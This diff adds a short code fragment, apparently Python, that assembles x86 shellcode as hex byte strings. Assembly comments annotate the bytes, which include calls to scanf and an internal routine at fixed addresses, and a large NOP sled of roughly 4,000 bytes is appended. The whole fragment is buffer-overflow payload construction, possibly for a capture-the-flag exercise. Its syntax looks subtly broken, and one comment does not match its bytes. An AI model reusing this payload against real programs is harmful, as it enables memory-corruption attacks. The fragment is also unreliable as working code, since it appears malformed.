@@ -1,0 +1,17 @@
+beginingOFShell =  "C7 45 08 63 61 40 00" +										#"mov [ebp+8], "PEEK"
+					"8B 45 0C 89 44 24 04 C7 04 24 68 61 40 00 E8 CA 30 00 00"+ #eax,DWORD PTR [ebp+0xc]
+																				#DWORD PTR [esp+0x4],eax
+																				#DWORD PTR [esp],0x406168
+																				#call scanf
+					"83 c4 10 " 												#add    esp,16
+					"C7 44 24 10 00 00 00 00 C7 44 24 0C 80 80 40 00"        + #mov 	dword ptr [esp+16], 0
+																				#mov    DWORD PTR [esp+0xc],0x408080
+					"8D 85 6C DF FF FF 89 44 24 08 8B 45 F0"				 + # lea     eax, [ebp-2094h]
+																				#mov    DWORD PTR [esp+0x8],eax
+																				#mov    eax,DWORD PTR [ebp-0x10]
+					"89 44 24 04 8B 45 08 89 04 24 E8 D6 FA FF FF"			+ #mov    DWORD PTR [esp+0x4],eax
+																				#mov    eax,DWORD PTR [ebp+0x8]
+																				# mov    DWORD PTR [esp],eax
+																				#call    sub_401892
+						"83 c4 f0  "											# esp ,-16
+						+"90"* (4172 - 152/2)
